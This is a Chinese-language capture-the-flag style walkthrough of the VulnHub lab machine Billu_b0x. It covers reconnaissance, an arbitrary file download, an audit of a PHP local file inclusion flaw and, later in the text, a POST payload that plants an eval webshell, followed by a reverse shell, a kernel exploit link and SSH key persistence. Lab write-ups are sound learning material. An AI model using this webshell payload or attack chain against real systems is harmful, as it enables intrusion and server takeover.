### 环境搭建
>[https://download.vulnhub.com/billu/Billu_b0x.zip](https://download.vulnhub.com/billu/Billu_b0x.zip)   
hash:ebcb435522917a67b54274900b37c6af

### 开搞
#### 首先nmap开路    
![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_1.png)    
访问```http://192.168.14.149/```    
![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_2.png)
>向世界上最帅老男人致敬

查看HTML源码并没什么*用，SQLmap无果后遍历目录       
![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_3.png)    
访问```http://192.168.14.149/test.php``` 报错缺少参数```file```    
![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_4.png)    
尝试POST提交```file=test.php```此处为任意文件下载，将目录遍历出的文件全部下载开始代码审计。     
![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_5.png)    

#### 审计

主页登录成功后跳转至```panel.php```查看panel.php源码第33行起，当```load```为非add与show时可构造任意文件包含攻击   
```
if(isset($_POST['continue']))
{
	$dir=getcwd();
	$choice=str_replace('./','',$_POST['load']);
	
	if($choice==='add')
	{
       		include($dir.'/'.$choice.'.php');
			die();
	}
	
        if($choice==='show')
	{
        
		include($dir.'/'.$choice.'.php');
		die();
	}
	else
	{
		include($dir.'/'.$_POST['load']);
	}
	
}
```

文件上传验证文件后缀与文件类型，经测试无法构造绕过。
```
$image=array('jpeg','jpg','gif','png');
	if(in_array($r,$image))
	{
		$finfo = @new finfo(FILEINFO_MIME); 
	$filetype = @$finfo->file($_FILES['image']['tmp_name']);
		if(preg_match('/image\/jpeg/',$filetype )  || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype ))
```
#### 利用
```c.php```中找到数据库账号密码```billu/b0x_billu```,登录phpmyadmin找到用户名口令    
![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_6.png)    
登录成功后上传图片马到```uploaded_images/```目录下构造payload如下
```
POST /panel.php
continue=&load=uploaded_images/trial.png&trial=file_put_contents('test.php','<?php @eval($_POST[test]);?>');
```    
菜刀连接```uploaded_images/test.php```查看版本    
![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_7.png)    
反弹shell     
![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_8.png)    
提权    
![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_9.png)    
[https://www.exploit-db.com/exploits/37292/](https://www.exploit-db.com/exploits/37292/)     
写入免密密匙  然后。。就没有然后了
